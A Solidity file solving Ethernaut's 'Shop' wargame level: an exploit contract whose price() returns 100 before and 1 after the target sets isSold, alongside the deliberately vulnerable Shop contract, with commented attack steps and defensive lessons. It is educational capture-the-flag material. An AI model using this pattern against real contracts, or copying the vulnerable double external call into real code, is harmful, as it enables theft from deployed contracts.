// Ethernaut Challenge #21: Shop
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*
 * SHOP CHALLENGE
 * 
 * Goal: Buy item for less than the asking price.
 * 
 * THE VULNERABILITY:
 * The price() function is called TWICE:
 * 1. In require(isSold == false) block - to check if we have enough
 * 2. After updating isSold = true - to charge us
 * 
 * If we can make price() return different values on these two calls,
 * we can pass the check (high price) but pay less (low price)!
 * 
 * THE TRICK:
 * price() is a view function, but view functions can still:
 * - Read state (including isSold)
 * - Return different values based on state
 * 
 * We return 100 when isSold == false, and 1 when isSold == true.
 */

interface Buyer {
    function price() external view returns (uint);
}

contract ShopExploit is Buyer {
    Shop public target;
    
    constructor(address _target) {
        target = Shop(_target);
    }
    
    // Called twice by Shop.buy()
    function price() external view override returns (uint) {
        // First call: isSold = false, return 100 (passes check)
        // Second call: isSold = true, return 1 (cheap!)
        return target.isSold() ? 1 : 100;
    }
    
    function attack() external {
        target.buy();
    }
}

contract Shop {
    uint public price = 100;
    bool public isSold;
    
    function buy() public {
        Buyer _buyer = Buyer(msg.sender);
        
        // First price() call - checks affordability
        if (_buyer.price() >= price && !isSold) {
            isSold = true; // ← State changes HERE
            
            // Second price() call - actual payment
            // If price() now returns less, we pay less!
            price = _buyer.price();
        }
    }
}

/*
 * ATTACK STEPS:
 * 
 * 1. Deploy ShopExploit with target address
 * 2. Call attack() → triggers buy()
 * 3. buy() calls price():
 *    - isSold = false → returns 100
 *    - 100 >= 100 ✓, isSold = false ✓, enters if block
 * 4. isSold = true (state updated)
 * 5. buy() calls price() again:
 *    - isSold = true → returns 1
 * 6. price = 1 (we paid 1, not 100!)
 * 
 * LESSON:
 * - View functions can change return values based on state
 * - Never assume view functions return consistent values
 * - Calling external functions multiple times is risky
 * - State can change between calls in the same transaction
 * 
 * This is similar to reentrancy but for view functions!
 */
